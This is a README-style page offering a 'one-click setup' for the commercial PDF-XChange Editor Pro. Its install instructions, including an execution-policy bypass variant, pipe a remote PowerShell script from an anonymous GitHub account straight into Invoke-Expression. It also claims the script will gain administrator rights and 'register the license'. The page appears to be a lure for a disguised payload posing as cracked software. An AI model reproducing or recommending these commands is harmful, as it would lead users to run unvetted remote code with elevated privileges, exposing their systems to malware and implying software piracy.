# PDF XChange Editor Pro Setup
One-click setup for PDF-XChange Editor Pro Setup -- the feature-rich PDF editor with full text editing, OCR, annotation tools, digital signing, and form filling as the best Adobe Acrobat alternative.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for OCR language engine and print driver installation.
- Downloads PDF-XChange Editor Pro installer with all OCR language packs.
- Installs the full Pro edition with OCR, digital signing, and form tools.
- Sets PDF-XChange Editor as the system default PDF viewer and registers the license.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~250 MB free disk space

## Troubleshooting

**OCR produces many recognition errors on scanned documents**

Set the OCR language to match your document language in Tools > OCR Page â€” default English fails on other scripts.

**Digitally signed PDFs show signatures as invalid after saving**

Enable Incremental Saves in Document > Document Properties > Save Options to preserve signature validity.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.